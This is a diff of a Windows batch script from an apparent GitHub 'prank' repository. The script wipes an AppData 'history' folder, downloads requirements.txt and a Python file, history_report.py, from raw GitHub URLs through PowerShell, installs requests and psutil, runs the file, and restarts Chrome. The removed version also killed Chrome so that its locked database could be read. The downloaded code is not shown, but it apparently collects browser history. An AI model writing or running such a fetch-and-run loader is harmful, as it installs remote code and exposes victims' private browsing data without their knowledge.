@@ -1,71 +1,51 @@
 @echo off
+cls
 echo Starting process...
 
-:: Check if the history folder exists
-if exist "%APPDATA%\history" (
+REM Step 1: Check if the history folder exists
+IF EXIST "C:\Users\Marco\AppData\Roaming\history" (
     echo History folder exists. Deleting the old history folder...
-    rmdir /s /q "%APPDATA%\history"
+    rmdir /S /Q "C:\Users\Marco\AppData\Roaming\history"
 )
 
-:: Create the history folder again
-mkdir "%APPDATA%\history"
+REM Step 2: Create the history folder
+echo Creating history folder...
+mkdir "C:\Users\Marco\AppData\Roaming\history"
 
-:: Navigate to the folder
-cd "%APPDATA%\history"
+REM Step 3: Download requirements.txt (no gpuinfo)
+echo Downloading 'requirements.txt'...
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/requirements.txt', 'C:\Users\Marco\AppData\Roaming\history\requirements.txt')"
 
-:: Check if 'requirements.txt' exists and download if necessary
-if not exist "requirements.txt" (
-    echo Downloading 'requirements.txt'...
-    powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/requirements.txt' -OutFile 'requirements.txt'"
-)
+REM Step 4: Download the Python script
+echo Downloading the Python script...
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/history_report.py', 'C:\Users\Marco\AppData\Roaming\history\history_report.py')"
 
-:: Install necessary Python packages silently
+REM Step 5: Install the required Python libraries (requests and psutil)
 echo Installing required libraries...
-pip install --quiet --user -r requirements.txt
+python -m pip install --upgrade pip
+python -m pip install -r "C:\Users\Marco\AppData\Roaming\history\requirements.txt"
 
-:: Check if the Python script exists and download if necessary
-if not exist "history_report.py" (
-    echo Downloading the Python script...
-    powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/history_report.py' -OutFile 'history_report.py'"
+REM Step 6: Check if the installation of libraries was successful
+echo Verifying installation...
+python -m pip show requests
+python -m pip show psutil
+
+REM Step 7: Check if installation was successful and run the script
+IF EXIST "C:\Users\Marco\AppData\Roaming\history\history_report.py" (
+    echo Python script downloaded. Running the Python script...
+    python "C:\Users\Marco\AppData\Roaming\history\history_report.py"
+    REM Wait 3 seconds before opening Google
+    timeout /T 3 /NOBREAK
+    start chrome
+) ELSE (
+    echo Error: Python script not found.
 )
 
-:: Retry logic for checking if the database is locked
-set retries=0
-set max_retries=5
-:retry
-echo Checking if the database is locked...
-python "%APPDATA%\history\history_report.py"
-if %ERRORLEVEL% equ 0 (
-    echo Database is not locked. Continuing...
-    goto run_script
-) else (
-    set /a retries+=1
-    if %retries% lss %max_retries% (
-        echo Database is locked, retrying... (%retries%/%max_retries%)
-        timeout /t 5 /nobreak
-        goto retry
-    ) else (
-        echo Max retries reached. Exiting...
-        exit /b
-    )
+REM Step 8: Error handling for missing Google Chrome process
+tasklist | findstr "chrome.exe" >nul
+IF %ERRORLEVEL% NEQ 0 (
+    echo ERROR: The process "chrome.exe" not found.
 )
-
-:run_script
-:: Wait 3 seconds before reopening Google
-timeout /t 3 /nobreak
-
-:: Check if Chrome is running and close it
-tasklist /fi "imagename eq chrome.exe" 2>nul | find /i "chrome.exe" >nul
-if not errorlevel 1 (
-    echo Closing Chrome...
-    taskkill /f /im chrome.exe
-) else (
-    echo Chrome is not running.
-)
-
-:: Reopen Google Chrome
-echo Reopening Chrome...
-start chrome.exe
 
 echo Process complete!
 pause
